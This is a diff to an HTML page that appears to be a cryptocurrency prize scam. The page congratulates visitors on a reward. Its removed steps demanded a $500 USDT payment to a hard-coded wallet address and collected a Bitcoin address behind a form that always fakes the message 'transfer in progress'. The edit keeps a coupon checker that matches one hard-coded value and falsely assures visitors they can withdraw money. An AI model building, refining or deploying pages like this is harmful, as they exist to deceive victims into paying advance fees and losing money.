@@ -96,6 +96,19 @@
             word-break: break-all;
         }
 
+        /* Error and Success Messages */
+        .error-message {
+            color: red;
+            font-size: 1rem;
+            margin-top: 10px;
+        }
+
+        .success-message {
+            color: green;
+            font-size: 1rem;
+            margin-top: 10px;
+        }
+
         /* Responsive Design */
         @media (max-width: 768px) {
             body {
@@ -152,60 +165,28 @@
             <p class="large-text">Congratulations! Follow the steps below to claim your reward.</p>
         </div>
 
-        <!-- Step 1: Payment Section -->
-        <div class="grid-item">
-            <h2>Step 1: Send $500 USDT (ERC20)</h2>
-            <p>To claim your prize, send $500 USDT to the following wallet address:</p>
-            <p class="copyable" id="wallet-address">0xf1Da95206AbC1f30b49C4DcAbaeB068029a8EE54</p>
-            <button onclick="copyToClipboard()">Copy Wallet Address</button>
-        </div>
-
-        <!-- Step 2: Bitcoin Wallet Submission -->
-        <div class="grid-item">
-            <h2>Step 2: Submit Your Bitcoin Wallet</h2>
-            <p>Enter your Bitcoin wallet address below to receive your prize:</p>
-            <form id="bitcoin-form" onsubmit="handleBitcoinSubmission(event)">
-                <input type="text" id="bitcoin-wallet" name="bitcoin-wallet" placeholder="Your Bitcoin Wallet Address" required>
-                <button type="submit">Submit Address</button>
-            </form>
-            <p id="submission-result" style="margin-top: 15px; font-size: 1.2rem; font-weight: bold;"></p>
-        </div>
-
         <!-- Step 3: Prize Verification -->
         <div class="grid-item">
             <h2>Verify Prize Withdrawal</h2>
             <p>Enter your coupon or transaction ID to check if your prize has been claimed:</p>
             <input type="text" id="coupon-code" placeholder="Enter Coupon/Transaction ID" required>
             <button onclick="verifyCoupon()">Verify</button>
-            <p id="verification-result" style="margin-top: 15px; font-size: 1.2rem; font-weight: bold;"></p>
+            <p id="verification-result" class="error-message"></p>
         </div>
     </div>
 
     <script>
-        function copyToClipboard() {
-            const walletAddress = document.getElementById('wallet-address').innerText;
-            navigator.clipboard.writeText(walletAddress)
-                .then(() => alert('Wallet address copied to clipboard!'))
-                .catch(err => console.error('Failed to copy: ', err));
-        }
-
-        function handleBitcoinSubmission(event) {
-            event.preventDefault();
-            const walletInput = document.getElementById('bitcoin-wallet').value.trim();
-            const resultMessage = document.getElementById('submission-result');
-            resultMessage.style.color = 'green';
-            resultMessage.textContent = 'The transfer is in progress, please wait only 10 minutes.';
-        }
-
         function verifyCoupon() {
             const couponInput = document.getElementById('coupon-code').value.trim();
             const verificationResult = document.getElementById('verification-result');
-
-            if (couponInput === '1861484107') {
-                verificationResult.style.color = 'green';
+            
+            const validCoupon = '1861464107'; // Update this value if needed
+            
+            if (couponInput === validCoupon) {
+                verificationResult.className = 'success-message';
                 verificationResult.textContent = 'The card is still working. You can withdraw the money.';
             } else {
-                verificationResult.style.color = 'red';
+                verificationResult.className = 'error-message';
                 verificationResult.textContent = 'Invalid coupon or the prize has already been claimed.';
             }
         }
